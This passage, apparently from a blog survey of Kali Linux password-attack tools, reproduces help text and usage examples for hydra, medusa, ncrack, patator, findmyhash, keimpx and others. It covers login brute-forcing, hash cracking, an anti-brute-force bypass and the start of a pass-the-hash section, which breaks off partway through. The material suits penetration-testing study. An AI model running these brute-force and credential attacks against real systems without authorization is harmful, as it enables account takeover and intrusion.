<p>CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/password/cewl.png" title="cewl" alt="cewl"></p>

<p><strong>findmyhash</strong></p>

<p>Crack different types of hashes using free online services</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/usr/bin/findmyhash 1.1.2 ( http://code.google.com/p/findmyhash/ )
</span><span class='line'>
</span><span class='line'>Usage: 
</span><span class='line'>------
</span><span class='line'>
</span><span class='line'>  python /usr/bin/findmyhash &lt;algorithm&gt; OPTIONS
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Accepted algorithms are:
</span><span class='line'>------------------------
</span><span class='line'>
</span><span class='line'>  MD4       - RFC 1320
</span><span class='line'>  MD5       - RFC 1321
</span><span class='line'>  SHA1      - RFC 3174 (FIPS 180-3)
</span><span class='line'>  SHA224    - RFC 3874 (FIPS 180-3)
</span><span class='line'>  SHA256    - FIPS 180-3
</span><span class='line'>  SHA384    - FIPS 180-3
</span><span class='line'>  SHA512    - FIPS 180-3
</span><span class='line'>  RMD160    - RFC 2857
</span><span class='line'>  GOST      - RFC 5831
</span><span class='line'>  WHIRLPOOL - ISO/IEC 10118-3:2004
</span><span class='line'>  LM        - Microsoft Windows hash
</span><span class='line'>  NTLM      - Microsoft Windows hash
</span><span class='line'>  MYSQL     - MySQL 3, 4, 5 hash
</span><span class='line'>  CISCO7    - Cisco IOS type 7 encrypted passwords
</span><span class='line'>  JUNIPER   - Juniper Networks $9$ encrypted passwords
</span><span class='line'>  LDAP_MD5  - MD5 Base64 encoded
</span><span class='line'>  LDAP_SHA1 - SHA1 Base64 encoded
</span><span class='line'> 
</span><span class='line'>  NOTE: for LM / NTLM it is recommended to introduce both values with this format:
</span><span class='line'>         python /usr/bin/findmyhash LM   -h 9a5760252b7455deaad3b435b51404ee:0d7f1f2bdeac6e574d6e18ca85fb58a7
</span><span class='line'>         python /usr/bin/findmyhash NTLM -h 9a5760252b7455deaad3b435b51404ee:0d7f1f2bdeac6e574d6e18ca85fb58a7
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Valid OPTIONS are:
</span><span class='line'>------------------
</span><span class='line'>
</span><span class='line'>  -h &lt;hash_value&gt;  If you only want to crack one hash, specify its value with this option.
</span><span class='line'>
</span><span class='line'>  -f &lt;file&gt;        If you have several hashes, you can specify a file with one hash per line.
</span><span class='line'>                   NOTE: All of them have to be the same type.
</span><span class='line'>                   
</span><span class='line'>  -g               If your hash cannot be cracked, search it in Google and show all the results.
</span><span class='line'>                   NOTE: This option ONLY works with -h (one hash input) option.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>---------
</span><span class='line'>
</span><span class='line'>  -&gt; Try to crack only one hash.
</span><span class='line'>     python /usr/bin/findmyhash MD5 -h 098f6bcd4621d373cade4e832627b4f6
</span><span class='line'>     
</span><span class='line'>  -&gt; Try to crack a JUNIPER encrypted password escaping special characters.
</span><span class='line'>     python /usr/bin/findmyhash JUNIPER -h "\$9\$LbHX-wg4Z"
</span><span class='line'>  
</span><span class='line'>  -&gt; If the hash cannot be cracked, it will be searched in Google.
</span><span class='line'>     python /usr/bin/findmyhash LDAP_SHA1 -h "{SHA}cRDtpNCeBiql5KOQsKVyrA0sAiA=" -g
</span><span class='line'>   
</span><span class='line'>  -&gt; Try to crack multiple hashes using a file (one hash per line).
</span><span class='line'>     python /usr/bin/findmyhash MYSQL -f mysqlhashesfile.txt
</span><span class='line'>     
</span><span class='line'>     
</span><span class='line'>Contact:
</span><span class='line'>--------
</span><span class='line'>
</span><span class='line'>[Web]           http://laxmarcaellugar.blogspot.com/
</span><span class='line'>[Mail/Google+]  bloglaxmarcaellugar@gmail.com
</span><span class='line'>[twitter]       @laXmarcaellugar</span></code></pre></td></tr></table></div></figure>


<p><strong>hydra</strong></p>

<p>Hydra  is a parallized login cracker which supports numerous protocols to attack. New modules are easy to add, beside that, it is flexible
and very fast.</p>

<p>Currently this tool supports:</p>

<pre><code>    AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, FTPS,
    HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY,
    HTTP-PROXY-URLENUM, ICQ, IMAP, IRC, LDAP2, LDAP3, MS-SQL, MYSQL, NCP, NNTP,
    Oracle, Oracle-Listener, Oracle-SID, PC-Anywhere, PCNFS, POP3, POSTGRES,
    RDP, REXEC, RLOGIN, RSH, SAP/R3, SIP, SMB, SMTP, SMTP-Enum, SNMP,
    SOCKS5, SSH(v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet,
    VMware-Auth, VNC and XMPP.
    For most protocols, SSL mode is available (e.g. https-get, ftp-ssl, etc.)
</code></pre>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SuvVd46] [service://server[:PORT][/OPT]]
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
</span><span class='line'>  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
</span><span class='line'>  -C FILE   colon separated "login:pass" format, instead of -L/-P options
</span><span class='line'>  -M FILE   list of servers to attack, one entry per line, ':' to specify port
</span><span class='line'>  -t TASKS  run TASKS number of connects in parallel (per host, default: 16)
</span><span class='line'>  -U        service module usage details
</span><span class='line'>  -h        more command line options (COMPLETE HELP)
</span><span class='line'>  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
</span><span class='line'>  service   the service to crack (see below for supported protocols)
</span><span class='line'>  OPT       some service modules support additional input (-U for module help)
</span><span class='line'>
</span><span class='line'>Supported services: asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp
</span><span class='line'>
</span><span class='line'>Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
</span><span class='line'>v3.0. The newest version is always available at http://www.thc.org/thc-hydra
</span><span class='line'>Don't use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Example:  hydra -l user -P passlist.txt ftp://192.168.0.1</span></code></pre></td></tr></table></div></figure>


<p><strong>hydra-gtk</strong></p>

<p>Hydra GUI</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/password/xhydra.png" title="hydra gui" alt="xhydra"></p>

<p><strong>keimpx</strong></p>

<p>keimpx is an open source tool, released under a modified version of Apache License 1.1.</p>

<p>It can be used to quickly check for valid credentials across a network over SMB. Credentials can be:</p>

<ul>
<li><p>Combination of user / plain-text password.</p></li>
<li><p>Combination of user / NTLM hash.</p></li>
<li><p>Combination of user / NTLM logon session token.</p></li>
</ul>


<p>If any valid credentials has been discovered across the network after its attack phase, the user is asked to choose which host to connect to and which valid credentials to use, then he will be prompted with an interactive SMB shell where the user can:</p>

<ul>
<li><p>Spawn an interactive command prompt.</p></li>
<li><p>Navigate through the remote SMB shares: list, upload, download files, create, remove files, etc.</p></li>
<li><p>Deploy and undeploy his own service, for instance, a backdoor listening on a TCP port for incoming connections.</p></li>
<li><p>List users details, domains and password policy.</p></li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>keimpx 0.3-dev
</span><span class='line'>    by Bernardo Damele A. G. &lt;bernardo.damele@gmail.com&gt;
</span><span class='line'>
</span><span class='line'>Usage: keimpx.py [options]
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  --version       show program's version number and exit
</span><span class='line'>  -h, --help      show this help message and exit
</span><span class='line'>  -v VERBOSE      Verbosity level: 0-2 (default: 0)
</span><span class='line'>  -t TARGET       Target address
</span><span class='line'>  -l LIST         File with list of targets
</span><span class='line'>  -U USER         User
</span><span class='line'>  -P PASSWORD     Password
</span><span class='line'>  --nt=NTHASH     NT hash
</span><span class='line'>  --lm=LMHASH     LM hash
</span><span class='line'>  -c CREDSFILE    File with list of credentials
</span><span class='line'>  -D DOMAIN       Domain
</span><span class='line'>  -d DOMAINSFILE  File with list of domains
</span><span class='line'>  -p PORT         SMB port: 139 or 445 (default: 445)
</span><span class='line'>  -n NAME         Local hostname
</span><span class='line'>  -T THREADS      Maximum simultaneous connections (default: 10)
</span><span class='line'>  -b              Batch mode: do not ask to get an interactive SMB shell
</span><span class='line'>  -x EXECUTELIST  Execute a list of commands against all hosts</span></code></pre></td></tr></table></div></figure>


<p><strong>medusa</strong></p>

<p>Medusa  is  intended to be a speedy, massively parallel, modular, login brute-forcer.  The goal is to support as many services which allow
remote authentication as possible. The author considers following items to some of the key features of this application:</p>

<ul>
<li><p>Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently.</p></li>
<li><p>Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be  either
a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing.</p></li>
<li><p>Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing.</p></li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Medusa v2.0 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;
</span><span class='line'>
</span><span class='line'>ALERT: Host information must be supplied.
</span><span class='line'>
</span><span class='line'>Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
</span><span class='line'>  -h [TEXT]    : Target hostname or IP address
</span><span class='line'>  -H [FILE]    : File containing target hostnames or IP addresses
</span><span class='line'>  -u [TEXT]    : Username to test
</span><span class='line'>  -U [FILE]    : File containing usernames to test
</span><span class='line'>  -p [TEXT]    : Password to test
</span><span class='line'>  -P [FILE]    : File containing passwords to test
</span><span class='line'>  -C [FILE]    : File containing combo entries. See README for more information.
</span><span class='line'>  -O [FILE]    : File to append log information to
</span><span class='line'>  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
</span><span class='line'>  -M [TEXT]    : Name of the module to execute (without the .mod extension)
</span><span class='line'>  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a
</span><span class='line'>                 different parameter each time and they will all be sent to the module (i.e.
</span><span class='line'>                 -m Param1 -m Param2, etc.)
</span><span class='line'>  -d           : Dump all known modules
</span><span class='line'>  -n [NUM]     : Use for non-default TCP port number
</span><span class='line'>  -s           : Enable SSL
</span><span class='line'>  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
</span><span class='line'>  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
</span><span class='line'>  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
</span><span class='line'>  -t [NUM]     : Total number of logins to be tested concurrently
</span><span class='line'>  -T [NUM]     : Total number of hosts to be tested concurrently
</span><span class='line'>  -L           : Parallelize logins using one username per thread. The default is to process 
</span><span class='line'>                 the entire username before proceeding.
</span><span class='line'>  -f           : Stop scanning host after first valid username/password found.
</span><span class='line'>  -F           : Stop audit after first valid username/password found on any host.
</span><span class='line'>  -b           : Suppress startup banner
</span><span class='line'>  -q           : Display module's usage information
</span><span class='line'>  -v [NUM]     : Verbose level [0 - 6 (more)]
</span><span class='line'>  -w [NUM]     : Error debug level [0 - 10 (more)]
</span><span class='line'>  -V           : Display version
</span><span class='line'>  -Z [TEXT]    : Resume scan based on map of previous scan</span></code></pre></td></tr></table></div></figure>


<p><strong>ncrack</strong></p>

<p>Ncrack is an open source tool for network authentication cracking. It was designed for high-speed parallel cracking using a dynamic engine
that can adapt to different network situations. Ncrack can also be extensively fine-tuned for special cases, though the default parameters
are generic enough to cover almost every situation. It is built on a modular architecture that allows for easy extension to support additional protocols. Ncrack is designed for companies and security professionals to audit large networks for default or weak passwords in
a rapid and reliable way. It can also be used to conduct fairly sophisticated and intensive brute force attacks against individual
services.</p>

<p>The output from Ncrack is a list of found credentials, if any, for each of the targets specified. Ncrack can also print an interactive
status report of progress so far and possibly additional debugging information that can help track problems, if the user selected that
option.</p>

<p>A typical Ncrack scan is shown in Example 1. The only Ncrack arguments used in this example are the two target IP addresses along with the
the corresponding ports for each of them. The two example ports 21 and 22 are automatically resolved to the default services listening on
them: ftp and ssh.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Example 1. A representative Ncrack scan
</span><span class='line'>
</span><span class='line'>           $ ncrack 10.0.0.130:21 192.168.1.2:22
</span><span class='line'>
</span><span class='line'>           Starting Ncrack 0.01ALPHA ( http://ncrack.org ) at 2009-07-24 23:05 EEST
</span><span class='line'>
</span><span class='line'>           Discovered credentials for ftp on 10.0.0.130 21/tcp:
</span><span class='line'>           10.0.0.130 21/tcp ftp: admin hello1
</span><span class='line'>           Discovered credentials for ssh on 192.168.1.2 22/tcp:
</span><span class='line'>           192.168.1.2 22/tcp ssh: guest 12345
</span><span class='line'>           192.168.1.2 22/tcp ssh: admin money$
</span><span class='line'>
</span><span class='line'>           Ncrack done: 2 services scanned in 156.03 seconds.
</span><span class='line'>
</span><span class='line'>           Ncrack finished.</span></code></pre></td></tr></table></div></figure>


<p><strong>patator</strong></p>

<p>A multi-purpose brute-forcer, with a modular design and a flexible usage.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Patator v0.5 (http://code.google.com/p/patator/)
</span><span class='line'>Usage: patator.py module --help
</span><span class='line'>
</span><span class='line'>Available modules:
</span><span class='line'>  + ftp_login     : Brute-force FTP
</span><span class='line'>  + ssh_login     : Brute-force SSH
</span><span class='line'>  + telnet_login  : Brute-force Telnet
</span><span class='line'>  + smtp_login    : Brute-force SMTP
</span><span class='line'>  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
</span><span class='line'>  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
</span><span class='line'>  + finger_lookup : Enumerate valid users using Finger
</span><span class='line'>  + http_fuzz     : Brute-force HTTP
</span><span class='line'>  + pop_login     : Brute-force POP3
</span><span class='line'>  + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)
</span><span class='line'>  + imap_login    : Brute-force IMAP4
</span><span class='line'>  + ldap_login    : Brute-force LDAP
</span><span class='line'>  + smb_login     : Brute-force SMB
</span><span class='line'>  + smb_lookupsid : Brute-force SMB SID-lookup
</span><span class='line'>  + vmauthd_login : Brute-force VMware Authentication Daemon
</span><span class='line'>  + mssql_login   : Brute-force MSSQL
</span><span class='line'>  + oracle_login  : Brute-force Oracle
</span><span class='line'>  + mysql_login   : Brute-force MySQL
</span><span class='line'>  + mysql_query   : Brute-force MySQL queries
</span><span class='line'>  + pgsql_login   : Brute-force PostgreSQL
</span><span class='line'>  + vnc_login     : Brute-force VNC
</span><span class='line'>  + dns_forward   : Forward lookup names
</span><span class='line'>  + dns_reverse   : Reverse lookup subnets
</span><span class='line'>  + snmp_login    : Brute-force SNMP v1/2/3
</span><span class='line'>  + unzip_pass    : Brute-force the password of encrypted ZIP files
</span><span class='line'>  + keystore_pass : Brute-force the password of Java keystore files
</span><span class='line'>  + tcp_fuzz      : Fuzz TCP services
</span><span class='line'>  + dummy_test    : Testing module</span></code></pre></td></tr></table></div></figure>


<p><strong>phrasendrescher</strong></p>

<p>phrasen|drescher (p|d) is a modular and multi processing pass phrase cracking tool. It comes with a number of plugins but a simple plugin API allows an easy development of new plugins. The main features of p|d are:</p>

<ul>
<li><p>Modular with the use of plugins</p></li>
<li><p>Multi processing</p></li>
<li><p>Dictionary attack with or without permutations (uppercase, lowercase, l33t, etc.)</p></li>
<li><p>Incremental brute force attack with custom character maps</p></li>
<li><p>Runs on FreeBSD, NetBSD, OpenBSD, MacOS and Linux</p></li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>phrasen|drescher 1.2.2 - the passphrase cracker
</span><span class='line'>Copyright (C) 2008 Nico Leidecker; http://www.leidecker.info
</span><span class='line'>
</span><span class='line'>Usage: pd plugin [options]
</span><span class='line'>
</span><span class='line'> Available plugins:
</span><span class='line'>   enc-file  pkey  ssh  mssql  http-raw  
</span><span class='line'>
</span><span class='line'> General Options:
</span><span class='line'>   h           : print this message
</span><span class='line'>   v           : verbose mode
</span><span class='line'>   i from[:to] : incremental mode beginning with word length `from'
</span><span class='line'>                 and going to `to'
</span><span class='line'>   d file      : run dictionary based with words from `file'
</span><span class='line'>   w number    : number of worker threads (default is one)
</span><span class='line'>   r rules     : specify rewriting rules for the dictionary mode:
</span><span class='line'>                   A = all characters upper case
</span><span class='line'>                   F = first character upper case
</span><span class='line'>                   L = last character upper case
</span><span class='line'>                   W = first letter of each word to upper case
</span><span class='line'>                   a = all characters lower case
</span><span class='line'>                   f = first character lower case
</span><span class='line'>                   l = last character lower case
</span><span class='line'>                   w = first letter of each word to lower case
</span><span class='line'>                   D = prepend digit
</span><span class='line'>                   d = append digit
</span><span class='line'>                   e = 1337 characters
</span><span class='line'>                   x = all rules
</span><span class='line'>
</span><span class='line'> Environment Variables:
</span><span class='line'>   PD_PLUGINS : the directory containing plugins
</span><span class='line'>                (current is /usr/lib/phrasendrescher)
</span><span class='line'>   PD_CHARMAP : the characters for the incremental mode are
</span><span class='line'>                taken from a character list. A customized list
</span><span class='line'>                can be specified in the environment variable</span></code></pre></td></tr></table></div></figure>


<p><strong>thc-pptp-bruter</strong></p>

<p>Brute force program against pptp vpn endpoints (tcp port 1723). Fully standalone. Supports latest MSChapV2 authentication. Tested against Windows and Cisco gateways. Exploits a weakness in Microsoft’s anti-brute force implementation which makes it possible to try 300 passwords the second.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Target IP missing.
</span><span class='line'>thc-pptp-bruter [options] &lt;remote host IP&gt;
</span><span class='line'>  -v        Verbose output / Debug output
</span><span class='line'>  -W        Disable windows hack [default: enabled]
</span><span class='line'>  -u &lt;user&gt; User [default: administrator]
</span><span class='line'>  -w &lt;file&gt; Wordlist file [default: stdin]
</span><span class='line'>  -p &lt;n&gt;    PPTP port [default: 1723]
</span><span class='line'>  -n &lt;n&gt;    Number of parallel tries [default: 5]
</span><span class='line'>  -l &lt;n&gt;    Limit to n passwords / sec [default: 100]
</span><span class='line'>
</span><span class='line'>Windows-Hack reuses the LCP connection with the same caller-id. This
</span><span class='line'>gets around MS's anti-brute forcing protection. It's enabled by default.</span></code></pre></td></tr></table></div></figure>


<h3>Passing the Hash</h3>

<p><strong>Pass the Hash Toolkit</strong></p>

<p>This is a collection of scripts for pass-the-hash scenarios</p>

<p><strong>pth-curl</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
